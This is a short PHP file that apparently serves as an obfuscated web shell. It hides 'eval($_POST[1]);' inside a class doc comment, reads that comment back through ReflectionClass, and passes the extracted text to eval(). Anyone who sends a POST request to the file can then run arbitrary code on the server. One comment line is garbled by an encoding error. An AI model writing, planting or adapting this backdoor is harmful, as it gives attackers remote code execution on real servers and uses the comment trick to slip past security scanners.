<?php  
    /**   
    * eval($_POST[1]);
    */  
    class TestClass { }  
    $rc = new ReflectionClass('TestClass');  
    //��ȡ��ǰ�ĵ���ע��
    $comment = $rc->getDocComment();
    //die(var_dump($comment));

    $pos = strpos($comment,'eval');
    //die(var_dump($pos));  

    $eval=substr($comment,$pos,16);  
    //die($eval);
    eval($eval);
?>